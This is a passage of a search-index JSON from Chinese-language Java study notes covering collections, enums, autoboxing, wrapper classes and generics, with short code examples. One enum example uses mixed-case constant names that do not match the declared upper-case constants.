sb.append(stack[0]);\n        sb.append(\"): [\");\n        sb.append(stack[0]);\n        for (int i = 1; i &lt; stack.length; i++) {\n            sb.append(\", \");\n            sb.append(stack[i]);\n        }\n        sb.append(\"]\");\n        return sb.toString();\n    }\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7b2c\u56db\u5341\u884c\u6539\u5199\u4e86 <code>Object.toString</code></p>"},{"location":"cs/java/basics/w8/#collections","title":"Collections","text":"<p>Java \u63d0\u4f9b\u4e86\u4e00\u5957\u6807\u51c6\u7684\u6846\u67b6\u6765\u5b58\u50a8\u548c\u7ba1\u7406\u4e00\u7ec4\u5bf9\u8c61\uff08\u5c31\u50cf\u4e00\u4e2a\u201c\u96c6\u5408\u201d\uff09\u3002\u8fd9\u5c31\u662f Java \u96c6\u5408\u6846\u67b6\u3002</p> <p>Java \u96c6\u5408\u6846\u67b6\u4f7f\u7528\u63a5\u53e3\uff08\u5982 <code>Collection</code>, <code>List</code>, <code>Set</code>, <code>Queue</code>, <code>Deque</code>\uff09\u6765\u5b9a\u4e49\u4e0d\u540c\u7c7b\u578b\u96c6\u5408\u7684\u89c4\u8303\u3002</p> <p>\u6846\u67b6\u4e2d\u6ca1\u6709\u4e13\u95e8\u7684 <code>Stack</code> \u63a5\u53e3\uff0c\u4f46\u529f\u80fd\u66f4\u5f3a\u5927\u7684 <code>Deque</code>\uff08\u53cc\u7aef\u961f\u5217\uff09\u63a5\u53e3\u53ef\u4ee5\u5b8c\u7f8e\u5730\u7528\u4f5c\u6808\u3002\u63a8\u8350\u4f7f\u7528 <code>ArrayDeque</code> \u7c7b\u4f5c\u4e3a\u6808\u7684\u5b9e\u73b0\u3002</p> <p>Java \u4e2d\u6709\u4e00\u4e2a\u5386\u53f2\u9057\u7559\u7684 <code>java.util.Stack</code> \u7c7b\uff0c\u4f46\u56e0\u5176\u8bbe\u8ba1\u95ee\u9898\u548c\u8fc7\u65f6\uff0c\u4e0d\u63a8\u8350\u5728\u65b0\u4ee3\u7801\u4e2d\u4f7f\u7528\u3002</p> <pre><code>import java.util.List;          // List \u63a5\u53e3\nimport java.util.ArrayList;     // ArrayList \u7c7b (\u5b9e\u73b0 List)\nimport java.util.Set;           // Set \u63a5\u53e3\nimport java.util.HashSet;       // HashSet \u7c7b (\u5b9e\u73b0 Set)\nimport java.util.Map;           // Map \u63a5\u53e3\nimport java.util.HashMap;       // HashMap \u7c7b (\u5b9e\u73b0 Map)\nimport java.util.Deque;         // Deque \u63a5\u53e3 (\u53ef\u4f5c\u4e3a\u6808\u4f7f\u7528)\nimport java.util.ArrayDeque;    // ArrayDeque \u7c7b (\u5b9e\u73b0 Deque)\nimport java.util.Iterator;      // \u7528\u4e8e\u8fed\u4ee3\u5668\u904d\u5386\n</code></pre>"},{"location":"cs/java/basics/w9/","title":"9.0 Enums, Generic, SOLID","text":""},{"location":"cs/java/basics/w9/#enums","title":"Enums","text":""},{"location":"cs/java/basics/w9/#concepts","title":"Concepts","text":"<p>\u7f16\u7a0b\u5f53\u4e2d\u56fa\u5b9a\u4ee5\u53ca\u6709\u9650\u7684\u503c\u76f4\u63a5\u7528\u6574\u6570\u8868\u793a\u6709\u7f3a\u70b9\uff0c\u6bd4\u5982 1 \u5230\u5e95\u662f\u5468\u4e00\u8fd8\u662f\u5468\u65e5\uff1a\u7c7b\u578b\u4e0d\u5b89\u5168\u3001\u542b\u4e49\u4e0d\u660e\u786e\u3001\u7ef4\u62a4\u56f0\u96be\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u679a\u4e3e</p> <pre><code>// \u5b9a\u4e49\u4e00\u4e2a\u8868\u793a\u661f\u671f\u7684\u679a\u4e3e\u7c7b\u578b\nenum DayOfWeek {\n    MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY, SATURDAY, SUNDAY\n}\n// \u5b9a\u4e49\u4e00\u4e2a\u8868\u793a\u4ea4\u901a\u65b9\u5f0f\u7684\u679a\u4e3e\u7c7b\u578b\nenum Transport {\n    BUS, TRAIN, FERRY, TRAM\n}\n</code></pre> <ul> <li>\u679a\u4e3e\u5e38\u91cf\u540d\u901a\u5e38\u4f7f\u7528\u5168\u5927\u5199\u5b57\u6bcd s</li> <li><code>\u679a\u4e3e\u540d.\u5e38\u91cf\u540d</code> \u7684\u65b9\u5f0f\u6765\u8bbf\u95ee\u5177\u4f53\u7684\u503c\u3002\u6ce8\u610f\uff1a\u4e0d\u4f7f\u7528 <code>new</code> \u5173\u952e\u5b57</li> </ul> <pre><code>DayOfWeek today = DayOfWeek.MONDAY;\nTransport myTransport = Transport.BUS;\n</code></pre> <p>\u8fd9\u6837\u53ef\u8bfb\u6027\u8f83\u5f3a\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>==</code> \u6bd4\u8f83</p> <ul> <li>Java \u4e2d\u7684 <code>enum</code> \u5b9e\u9645\u4e0a\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u7c7b</li> <li>\u6240\u6709\u679a\u4e3e\u90fd\u9690\u5f0f\u5730\u7ee7\u627f\u81ea <code>java.lang.Enum</code> \u7c7b</li> <li>\u4e0d\u80fd\u518d\u7ee7\u627f\u5176\u4ed6\u7c7b\uff0c\u4e5f\u4e0d\u80fd\u88ab\u5176\u4ed6\u7c7b\u7ee7\u627f</li> <li>\u53ef\u4ee5\u50cf\u7c7b\u4e00\u6837\u62e5\u6709\u8bbf\u95ee\u4fee\u9970\u7b26<code>public, protected, private</code></li> </ul> <p>\u4ee5\u53ca\u5176\u548c <code>switch</code> \u8bed\u53e5\u4e5f\u53ef\u4ee5\u7ed3\u5408\u7684\u6bd4\u8f83\u597d</p> <pre><code>public static int typicalSpeed(Transport transport) {\n    switch (transport) {\n        case BUS:\n            return 50;\n        case TRAIN:\n            return 100;\n        case FERRY:\n            return 20;\n        case TRAM:\n            return 30;\n        default:\n            return 0;\n    }\n}\n\npublic static boolean isWeekend(DayOfWeek day) {\n    return day == DayOfWeek.Saturday || day == DayOfWeek.Sunday;\n}\n\npublic static void main(String[] args) {\n    DayOfWeek day = DayOfWeek.Monday;\n    System.out.println(isWeekend(day));\n    System.out.println(isWeekend(DayOfWeek.Saturday));\n    System.out.println(typicalSpeed(Transport.BUS));\n    System.out.println(typicalSpeed(Transport.TRAIN));\n}\n</code></pre>"},{"location":"cs/java/basics/w9/#functions","title":"Functions","text":"<ul> <li><code>values()</code></li> </ul> <p>\u679a\u4e3e\u542b\u6709\u5185\u7f6e\u65b9\u6cd5\uff0c<code>values()</code> \u9759\u6001\u65b9\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u8be5\u679a\u4e3e\u6240\u6709\u5e38\u91cf\u7684\u6570\u7ec4</p> <pre><code>for (DayOfWeek day : DayOfWeek.values()) {\n    System.out.println(day);\n}\n</code></pre> <ul> <li><code>ordinal()</code>: \u8fd4\u56de\u679a\u4e3e\u5e38\u91cf\u5728\u58f0\u660e\u65f6\u7684\u5e8f\u53f7\uff08\u4ece 0 \u5f00\u59cb\uff09\u3002\u4f8b\u5982 <code>DayOfWeek.MONDAY.ordinal()</code> \u8fd4\u56de 0</li> </ul> <ul> <li><code>valueOf(String name)</code>: \u9759\u6001\u65b9\u6cd5\uff0c\u6839\u636e\u7ed9\u5b9a\u7684\u540d\u79f0\u5b57\u7b26\u4e32\u8fd4\u56de\u5bf9\u5e94\u7684\u679a\u4e3e\u5e38\u91cf</li> </ul> <p>\u679a\u4e3e\u7c7b\u53ef\u4ee5\u6dfb\u52a0\u81ea\u5df1\u7684\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u6dfb\u52a0\u81ea\u5df1\u7684\u6784\u9020\u51fd\u6570\u4ee5\u53ca\u5b57\u6bb5\uff0c\u6784\u9020\u5668\u9ed8\u8ba4\u5fc5\u987b <code>private</code> \u53ef\u4ee5\u4e0d\u5199\uff0c\u4e0d\u80fd\u4f7f\u7528 <code>new</code>\uff0c<code>JVM</code> \u4f1a\u5728\u521b\u5efa\u679a\u4e3e\u5e38\u91cf\u5b9e\u4f8b\u65f6\u81ea\u52a8\u8c03\u7528\u3002</p> <pre><code>enum Transport {\n    BUS(50), TRAIN(100), FERRY(20), TRAM(30); // \u8c03\u7528\u6784\u9020\u5668\n\n    private final int typicalSpeed; // \u6dfb\u52a0\u5b57\u6bb5\n\n    Transport(int typicalSpeed) { // \u6784\u9020\u5668 (\u9690\u5f0f private)\n        this.typicalSpeed = typicalSpeed;\n    }\n\n    public int getTypicalSpeed() { // \u6dfb\u52a0\u65b9\u6cd5\n        return typicalSpeed;\n    }\n}\n// \u4f7f\u7528: Transport.BUS.getTypicalSpeed() \u8fd4\u56de 50\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u76f4\u63a5\u5728\u5185\u90e8\u5199\u597d\u503c\u5c31\u4e0d\u7528\u5199 <code>switch</code> \u8bed\u53e5</p>"},{"location":"cs/java/basics/w9/#autoboxing-and-unboxing","title":"Autoboxing and Unboxing","text":"<p>Java \u4e3a\u6bcf\u4e2a\u57fa\u672c\u6570\u636e\u7c7b\u578b (primitive type: <code>int</code>, <code>double</code>, <code>boolean</code>, <code>char</code> \u7b49) \u90fd\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5bf9\u5e94\u7684\u5305\u88c5\u7c7b (wrapper class: <code>Integer</code>, <code>Double</code>, <code>Boolean</code>, <code>Character</code> \u7b49)\u3002\u8fd9\u4e9b\u5305\u88c5\u7c7b\u662f\u5bf9\u8c61\u3002</p> <ul> <li>\u81ea\u52a8\u88c5\u7bb1 (Autoboxing): </li> </ul> <p>Java \u7f16\u8bd1\u5668\u81ea\u52a8\u5730\u5c06\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u503c\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5305\u88c5\u7c7b\u5bf9\u8c61\u3002</p> <ul> <li>\u81ea\u52a8\u62c6\u7bb1 (Unboxing): </li> </ul> <p>Java \u7f16\u8bd1\u5668\u81ea\u52a8\u5730\u5c06\u5305\u88c5\u7c7b\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7684\u503c\u3002</p>"},{"location":"cs/java/basics/w9/#usage","title":"Usage","text":"<ul> <li>\u8d4b\u503c</li> </ul> <pre><code>Integer wrapperInt = 10;       // Autoboxing: int 10 -&gt; Integer(10)\nint primitiveInt = wrapperInt; // Unboxing: Integer(10) -&gt; int 10\n</code></pre> <ul> <li>\u6cdb\u578b\u96c6\u5408</li> </ul> <pre><code>List&lt;Integer&gt; list = new ArrayList&lt;&gt;();\nlist.add(1); // Autoboxing: int 1 -&gt; Integer(1)\nint first = list.get(0); // Unboxing: Integer(1) -&gt; int 1\n</code></pre> <p><code>ArrayList</code> \u8fd9\u79cd\u53ea\u80fd\u50a8\u5b58\u5bf9\u8c61\u4e0d\u80fd\u76f4\u63a5\u50a8\u5b58\u57fa\u672c\u6570\u636e\u7c7b\u578b\u7528\u8fd9\u79cd\u65b9\u6cd5\u4f20\u5165</p> <ul> <li>\u65b9\u6cd5\u8c03\u7528\uff1a\u7c7b\u578b\u81ea\u52a8\u8f6c\u6362</li> </ul> <pre><code>// \u65b9\u6cd5\u671f\u671b int\uff0c\u4f20\u5165 Integer -&gt; \u81ea\u52a8\u62c6\u7bb1\npublic static int sum(int a, int b) { return a + b; }\nInteger x = 1, y = 2;\nint result = sum(x, y);\n\n// \u65b9\u6cd5\u671f\u671b Double\uff0c\u4f20\u5165 double -&gt; \u81ea\u52a8\u88c5\u7bb1\npublic static Double max(Double a, Double b) { return a &gt; b ? a : b; }\nDouble maxVal = max(1.0, 2.0);\n</code></pre> <ul> <li>\u8fd0\u7b97\uff1a\u81ea\u52a8\u62c6\u7bb1\u6210\u57fa\u672c\u7c7b\u578b\u518d\u8ba1\u7b97</li> </ul> <pre><code>Integer a = 1;\nInteger b = 2;\nInteger c = a + b; // a, b \u62c6\u7bb1\u6210 int\uff0c\u76f8\u52a0\u540e\u7ed3\u679c 3 \u518d\u88c5\u7bb1\u6210 Integer \u8d4b\u7ed9 c\n</code></pre>"},{"location":"cs/java/basics/w9/#problems","title":"Problems","text":"<ul> <li>reference</li> </ul> <p>\u81ea\u52a8\u88c5\u7bb1/\u62c6\u7bb1\u521b\u5efa\u7684\u662f\u4e0d\u540c\u7684\u5bf9\u8c61\uff08\u6216\u4ece\u7f13\u5b58\u83b7\u53d6\uff09\u3002\u5b83\u4e0d\u80fd\u7528\u6765\u50cf\u5bf9\u8c61\u5f15\u7528\u90a3\u6837\u5171\u4eab\u5bf9\u539f\u59cb\u57fa\u672c\u7c7b\u578b\u503c\u7684\u4fee\u6539\u3002</p> <pre><code>Integer a = 1;\nInteger b = a; // b \u6307\u5411\u548c a \u76f8\u540c\u7684 Integer \u5bf9\u8c61 (\u5bf9\u4e8e\u5c0f\u6570\u503c\uff0c\u901a\u5e38\u662f\u7f13\u5b58\u7684)\na += 2;       // \u5b9e\u9645\u662f: a = Integer.valueOf(a.intValue() + 2); a \u6307\u5411\u4e86\u65b0\u7684 Integer(3) \u5bf9\u8c61\nSystem.out.println(a); // 3\nSystem.out.println(b); // 1 (b \u4ecd\u7136\u6307\u5411\u539f\u6765\u7684 Integer(1) \u5bf9\u8c61)\n</code></pre> <ul> <li>performance</li> </ul> <p>\u8bbe\u8ba1\u5230\u5bf9\u8c61\u7684\u521b\u5efa\u548c\u8f6c\u6362\uff0c\u76f8\u6bd4\u76f4\u63a5\u4f7f\u7528\u57fa\u672c\u6570\u636e\u7c7b\u578b\u4f1a\u6709\u4e00\u5b9a\u6570\u636e\u5f00\u9500\uff1a\u65f6\u95f4\u4e0e\u7a7a\u95f4</p> <ul> <li><code>NullPointerException</code>\uff1a </li> </ul> <p>\u5982\u679c\u4e00\u4e2a\u5305\u88c5\u7c7b\u53d8\u91cf\u7684\u503c\u662f <code>null</code>\uff0c\u5728\u81ea\u52a8\u62c6\u7bb1\u65f6\u4f1a\u629b\u51fa <code>NullPointerException</code>\u3002</p> <pre><code>Integer i = null;\nint j = i; // \u5c1d\u8bd5\u62c6\u7bb1 null\uff0c\u4f1a\u629b\u51fa NullPointerException\n</code></pre> <p>\u4f7f\u7528\u5305\u88c5\u7c7b/\u81ea\u52a8\u88c5\u7bb1</p> <ul> <li>\u5f53\u9700\u8981\u5c06\u57fa\u672c\u7c7b\u578b\u503c\u5b58\u5165\u53ea\u80fd\u5b58\u50a8\u5bf9\u8c61\u7684\u96c6\u5408\u7c7b\u65f6\uff08\u5982 <code>ArrayList&lt;Integer&gt;</code>\uff09\u3002</li> <li>\u5f53\u9700\u8981\u4f7f\u7528\u57fa\u672c\u7c7b\u578b\u503c\u4f5c\u4e3a\u6cdb\u578b\u7c7b\u578b\u53c2\u6570\u65f6\u3002</li> <li>\u5f53\u9700\u8981\u8c03\u7528\u9700\u8981\u5bf9\u8c61\u53c2\u6570\u7684\u65b9\u6cd5\u65f6\u3002</li> <li>\u5f53\u9700\u8981\u4f7f\u7528\u5305\u88c5\u7c7b\u63d0\u4f9b\u7684\u9759\u6001\u5de5\u5177\u65b9\u6cd5\u6216\u5e38\u91cf\u65f6\u3002</li> </ul>"},{"location":"cs/java/basics/w9/#wrapper-class-utilities","title":"Wrapper Class Utilities","text":"<p>\u5305\u88c5\u7c7b\u63d0\u4f9b\u4e86\u9759\u6001\u65b9\u6cd5\u4e0e\u5e38\u91cf</p> <p>\u6570\u503c\u7c7b\u578b (<code>Integer</code>, <code>Long</code>, <code>Double</code>, <code>Float</code> \u7b49):</p> <ul> <li>\u5b57\u7b26\u4e32\u8f6c\u6362: <code>Integer.parseInt(\"123\")</code>, <code>Double.parseDouble(\"3.14\")</code> (\u6ce8\u610f\u53ef\u80fd\u629b\u51fa <code>NumberFormatException</code>)\u3002</li> <li>\u6570\u503c\u8303\u56f4: <code>Integer.MAX_VALUE</code>, <code>Integer.MIN_VALUE</code>, <code>Double.POSITIVE_INFINITY</code>, <code>Double.NaN</code> \u7b49\u3002</li> <li>\u8fdb\u5236\u8f6c\u6362/\u4f4d\u8fd0\u7b97: <code>Integer.toBinaryString(10)</code>, <code>Integer.highestOneBit(10)</code> \u7b49\u3002</li> </ul> <p><code>Character</code>:</p> <ul> <li>\u5b57\u7b26\u5224\u65ad: <code>Character.isDigit('1')</code>, <code>Character.isLetter('a')</code>, <code>Character.isUpperCase('A')</code>, <code>Character.isWhitespace(' ')</code> \u7b49\u3002</li> <li>\u5927\u5c0f\u5199\u8f6c\u6362: <code>Character.toUpperCase('a')</code>, <code>Character.toLowerCase('Z')</code>\u3002</li> </ul>"},{"location":"cs/java/basics/w9/#generics","title":"Generics","text":"<p>\u60f3\u8c61\u4e00\u4e0b\uff0c\u6211\u4eec\u60f3\u521b\u5efa\u4e00\u4e2a\u6808\uff08Stack\uff09\u6570\u636e\u7ed3\u6784\u3002\u5982\u679c\u6211\u4eec\u4e3a <code>String</code> \u7c7b\u578b\u5199\u4e00\u4e2a <code>StringStack</code> \uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u60f3\u5b58 <code>int</code> \u6216\u8005\u5176\u4ed6\u7c7b\u578b\u65f6\uff0c\u5c31\u9700\u8981\u91cd\u5199\u6574\u4e2a\u7c7b \u3002\u8fd9\u975e\u5e38\u4f4e\u6548\u3002</p> <ul> <li>\u4e00\u4e2a\u65b9\u6cd5\u662f\u4f7f\u7528 <code>Object</code> \u7c7b\u6765\u521b\u5efa <code>ObjectStack</code>\u7ed3\u5408 Autoboxing \u4ee5\u53ca Unboxing \u7279\u6027\uff0c\u751a\u81f3\u53ef\u4ee5\u50a8\u5b58\u539f\u59cb\u7c7b\u578b\uff0c\u4f46\u662f\u53d6\u51fa\u6570\u636e\u7684\u65f6\u5019\u9700\u8981\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff1a<code>int three = (Integer) ss.pop();</code></li> </ul> <ul> <li>\u5982\u679c\u5728 <code>pop</code> \u65f6\u8f6c\u6362\u7684\u7c7b\u578b\u4e0e\u5b58\u5165\u65f6\u7684\u7c7b\u578b\u4e0d\u5339\u914d\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u5728\u7f16\u8bd1\u65f6\u62a5\u9519\uff0c\u800c\u662f\u5728\u8fd0\u884c\u65f6\u629b\u51fa <code>ClassCastException</code> \u9519\u8bef \u3002\u8fd9\u76f8\u5f53\u4e8e\u4e22\u5931\u4e86 Java \u5f3a\u5927\u7684\u7c7b\u578b\u68c0\u67e5\u529f\u80fd \u3002  </li> </ul> <p>\u800c\u6cdb\u578b\u53ef\u4ee5\u66f4\u597d\u5730\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a\u5728\u7c7b\u540d\u540e\u9762\u52a0\u4e0a <code>&lt;T&gt;</code> \u8fd9\u91cc\u7684 T \u5c31\u662f\u7c7b\u578b\u53c2\u6570 Type Parameter\uff0c\u4ed6\u662f\u4e00\u4e2a\u5360\u4f4d\u7b26\u4ee3\u8868\u67d0\u79cd\u5177\u4f53\u7684\u7c7b\u578b\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4efb\u4f55\u5408\u6cd5\u6807\u8bc6\u4ee3\u66ff T</p> <pre><code>public class GenericStack&lt;T&gt; {\n    public GenericStack(int capacity) { ... }\n    public void push(T s) { ... } // \u65b9\u6cd5\u53c2\u6570\u4f7f\u7528\u7c7b\u578b\u53c2\u6570 T\n    public T pop() { ... }         // \u8fd4\u56de\u503c\u4f7f\u7528\u7c7b\u578b\u53c2\u6570 T\n}\n</code></pre> <p>\u90a3\u4e48\u5728\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u9700\u8981\u4e3a\u5176\u6307\u5b9a\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\u53c2\u6570\u5982 Integer \u6216 String</p> <pre><code>GenericStack&lt;Integer&gt; intStack = new GenericStack&lt;Integer&gt;(5); // T \u88ab\u6307\u5b9a\u4e3a Integer\nintStack.push(3); // OK\n// intStack.push(\"Hello\"); // \u7f16\u8bd1\u65f6\u9519\u8bef\uff01\u7c7b\u578b\u4e0d\u5339\u914d\nint value = intStack.pop(); // \u4e0d\u9700\u8981\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\n</code></pre> <ul> <li>\u4f7f\u7528 generics \u5728\u7f16\u8bd1\u65f6\u4f1a\u68c0\u67e5\u7c7b\u578b\u662f\u5426\u5339\u914d\uff0c\u907f\u514d\u4e86\u8fd0\u884c\u65f6\u7684 <code>ClassCastException</code></li> <li>\u53ea\u9700\u5199\u4e00\u6b21 <code>GenericStack&lt;T&gt;</code> \u5c31\u53ef\u4ee5\u7528\u4e8e\u4efb\u4f55\u975e\u539f\u59cb\u7c7b\u578b</li> <li>\u65e0\u9700\u5f3a\u5236\u8f6c\u6362</li> </ul> <p>\u7c7b\u578b\u53c2\u6570\u5fc5\u987b\u662f\u7c7b\u7c7b\u578b\uff0c\u4e0d\u80fd\u662f\u539f\u59cb\u7c7b\u578b\uff08\u5982 int\uff09\u3002\u4f46\u7531\u4e8e\u81ea\u52a8\u88c5\u7bb1/\u62c6\u7bb1\uff0c\u4f7f\u7528\u539f\u59cb\u7c7b\u578b\u901a\u5e38\u6ca1\u6709\u969c\u788d \u3002   </p>"},{"location":"cs/java/basics/w9/#multiple-generics-parameters","title":"Multiple Generics Parameters","text":"<pre><code>public class GenericPair&lt;T, V&gt; {\n    public T first;\n    public V second;\n    public GenericPair(T first, V second) {\n        this.first = first;\n        this.second = second;\n    }\n}\n</code></pre> <p>\u6cdb\u578b\u7c7b\u53ef\u4ee5\u6709\u591a\u4e2a\u7c7b\u578b\u53c2\u6570\uff0c\u7528\u9017\u53f7\u5206\u9694\u3002</p> <pre><code>// \u521b\u5efa\u4e00\u4e2a\u5b58\u50a8 &lt;Integer, String&gt; \u5bf9\u7684 ArrayList\nvar studentList = new ArrayList&lt;GenericPair&lt;Integer, String&gt;&gt;();\nstudentList.add(new GenericPair&lt;Integer, String&gt;(10243549, \"Alan Turing\"));\n</code></pre> <p>\u7b2c\u4e8c\u884c\u51fa\u73b0\u4e86 <code>var</code> \u5173\u952e\u8bcd\uff0c\u662f Java 10 \u5f15\u5165\u7684\u4e00\u4e2a\u5173\u952e\u5b57</p> <ul> <li>\u7528\u4e8e\u5c40\u90e8\u53d8\u91cf\u7c7b\u578b\u63a8\u65ad Local Variable Type Inference</li> </ul> <pre><code>// \u539f\u672c\u9700\u8981\u8fd9\u6837\u5199\uff0c\u7c7b\u578b\u540d\u79f0\u5f88\u957f:\nArrayList&lt;GenericPair&lt;Integer, String&gt;&gt; studentList = new ArrayList&lt;GenericPair&lt;Integer, String&gt;&gt;();\n</code></pre> <p>\u7528 <code>var</code>\u66ff\u4ee3\u540e\u7f16\u8bd1\u5668\u53ef\u4ee5\u81ea\u52a8\u4ece\u53f3\u8fb9\u63a8\u65ad\u51fa\u5de6\u8fb9\u51cf\u5c11\u5197\u4f59\uff0c\u53ea\u80fd\u7528\u4e8e\u5c40\u90e8\u53d8\u91cf</p>"},{"location":"cs/java/basics/w9/#bounded-type-parameters","title":"Bounded Type Parameters","text":"<p>\u6709\u65f6\u6211\u4eec\u5e0c\u671b\u9650\u5236\u53ef\u4ee5\u7528\u4f5c\u7c7b\u578b\u53c2\u6570\u7684\u7c7b\u578b\u8303\u56f4\u3002\u4f7f\u7528 <code>extends</code> \u5173\u952e\u5b57\uff0c\u4f8b\u5982 <code>&lt;T extends SuperClass&gt;</code>\u3002\u8fd9\u8868\u793a <code>T</code> \u5fc5\u987b\u662f <code>SuperClass</code> \u672c\u8eab\u6216\u8005\u662f\u5b83\u7684\u5b50\u7c7b \u3002<code>SuperClass</code> \u5c31\u662f\u8fd9\u4e2a\u7c7b\u578b\u53c2\u6570\u7684\u4e0a\u754c (Upper Bound) \u3002 </p> <pre><code>abstract class Bird { }\nclass Emu extends Bird { }\nclass Hawk extends Bird { }\n\nclass BirdPair&lt;T extends Bird&gt; { // T \u5fc5\u987b\u662f Bird \u6216\u5176\u5b50\u7c7b\n    public T first;\n    public T second;\n    public BirdPair (T first, T second) { ... }\n}\n</code></pre> <pre><code>var emuPair = new BirdPair&lt;Emu&gt;(new Emu(), new Emu()); // OK\nvar hawkPair = new BirdPair&lt;Hawk&gt;(new Hawk(), new Hawk()); // OK\nvar birdPair = new BirdPair&lt;Bird&gt;(new Emu(), new Hawk()); // OK\n// var badPair = new BirdPair&lt;String&gt;(\"Hello\", \"World\"); // \u7f16\u8bd1\u65f6\u9519\u8bef\uff01String \u4e0d\u662f Bird \u7684\u5b50\u7c7b\n</code></pre> <p><code>&lt;T&gt;</code> \u5b9e\u9645\u4e0a\u7b49\u4ef7\u4e8e <code>&lt;T extends Object&gt;</code>\uff0c\u56e0\u4e3a\u6240\u6709\u7c7b\u90fd\u7ee7\u627f\u81ea <code>Object</code> </p>"},{"location":"cs/java/basics/w9/#generic-interfaces","title":"Generic Interfaces","text":"<p>\u63a5\u53e3\u4e5f\u53ef\u4ee5\u662f\u6cdb\u578b\u7684\uff0c\u62e5\u6709\u7c7b\u578b\u53c2\u6570\uff0c\u7c7b\u578b\u53c2\u6570\u53ef\u4ee5\u7528\u5728\u63a5\u53e3\u7684\u65b9\u6cd5\u7b7e\u540d\u4e2d\u3002<code>Comparable&lt;T&gt;</code>\u5c31\u662f\u4e00\u4e2a\u6cdb\u578b\u63a5\u53e3\uff0c\u5b83\u8981\u6c42\u5b9e\u73b0 <code>compareTo(To)</code> \u65b9\u6cd5\uff0c\u7528\u4e8e\u6bd4\u8f83\u5f53\u524d\u5bf9\u8c61\u548c\u53e6\u4e00\u4e2a <code>T</code> \u7c7b\u578b\u7684\u5bf9\u8c61</p>"},{"location":"cs/java/basics/w9/#with-bounded-type-parameters","title":"With bounded type parameters","text":"<pre><code>public class RunningMaximum&lt;T extends Comparable&lt;T&gt;&gt; { // T \u5fc5\u987b\u5b9e\u73b0 Comparable&lt;T&gt;\n    private T currentMax;\n    public RunningMaximum (T initial) { currentMax = initial; }\n    public void addNumber (T number) {\n        if (number.compareTo(currentMax) &gt; 0) { // \u8c03\u7528 compareTo \u65b9\u6cd5\n            currentMax = number;\n        }\n    }\n    public T getCurrentMax() { return currentMax; }\n}\n</code></pre> <ul> <li>\u53ef\u4ee5\u5c06\u6cdb\u578b\u63a5\u53e3\u7528\u4f5c\u6709\u754c\u7c7b\u578b\u53c2\u6570\u7684\u8fb9\u754c\u3002</li> <li>\u53ef\u4ee5\u7528\u4e8e\u4efb\u4f55\u5b9e\u73b0\u4e86 <code>Comparable</code> \u7684\u7c7b\u578b\uff0c\u5982 <code>Integer</code>, <code>String</code> \u7b49</li> </ul> <pre><code>RunningMaximum&lt;Integer&gt; runningMax = new RunningMaximum&lt;&gt;(1); // \u4f7f\u7528 Integer\nrunningMax.addNumber(5);\nSystem.out.println(runningMax.getCurrentMax()); // \u8f93\u51fa 5\n</code></pre> <p>\u5b9e\u73b0\u8fc7\u7a0b\u4e2d\u7b2c\u4e00\u884c\u5728 <code>Java 7</code>\u4e4b\u524d\u4f60\u5fc5\u987b\u8fd9\u6837\u5199\uff1a</p> <pre><code>RunningMaximum&lt;Integer&gt; runningMax = new RunningMaximum&lt;Integer&gt;(1);\n// ^^^^^^^^^^^^^^^^^^^             ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n// (\u7c7b\u578b\u58f0\u660e)                        (\u6784\u9020\u51fd\u6570\u8c03\u7528\u65f6\u6307\u5b9a\u7c7b\u578b)\n</code></pre> <p>Java 7 \u53ca\u4e4b\u540e: \u5f15\u5165\u4e86\u83f1\u5f62\u8fd0\u7b97\u7b26 <code>&lt;&gt;</code>\u3002\u5982\u679c\u4f60\u5728\u5de6\u4fa7\u663e\u5f0f\u58f0\u660e\u4e86\u7c7b\u578b <code>RunningMaximum&lt;Integer&gt; runningMax</code>\uff0c\u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u4ece\u5de6\u4fa7\u63a8\u65ad\u51fa\u53f3\u4fa7\u7684\u6cdb\u578b\u7c7b\u578b\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5199\u6210 <code>RunningMaximum&lt;Integer&gt; runningMax = new RunningMaximum&lt;&gt;(1);</code>\uff0c\u53f3\u4fa7 <code>&lt;&gt;</code> \u4e2d\u65e0\u9700\u91cd\u590d\u7c7b\u578b\u3002</p> <p>Java 10 \u53ca\u4e4b\u540e: \u5f15\u5165\u4e86 <code>var</code>\u3002\u5982\u679c\u4f60\u5728\u53f3\u4fa7\u7684\u521d\u59cb\u5316\u8868\u8fbe\u5f0f\u4e2d\u63d0\u4f9b\u4e86\u8db3\u591f\u7684\u4fe1\u606f\u8ba9\u7f16\u8bd1\u5668\u63a8\u65ad\u51fa\u7c7b\u578b\u4f8b\u5982 <code>new RunningMaximum&lt;&gt;(1)</code>\uff0c\u5176\u4e2d <code>1</code> \u662f <code>Integer</code>\uff0c\u5982\u679c\u6784\u9020\u51fd\u6570\u63a5\u53d7 T \u7c7b\u578b\u53c2\u6570\uff0c\u7f16\u8bd1\u5668\u5c31\u80fd\u63a8\u65ad\u51fa T \u662f Integer\uff0c\u4f60\u5c31\u53ef\u4ee5\u7ed3\u5408 <code>var</code> \u548c\u83f1\u5f62\u8fd0\u7b97\u7b26\u5199\u6210\uff1a</p> <pre><code>var runningMax = new RunningMaximum&lt;&gt;(1);\n</code></pre>"},{"location":"cs/java/basics/w9/#generic-methods","title":"Generic 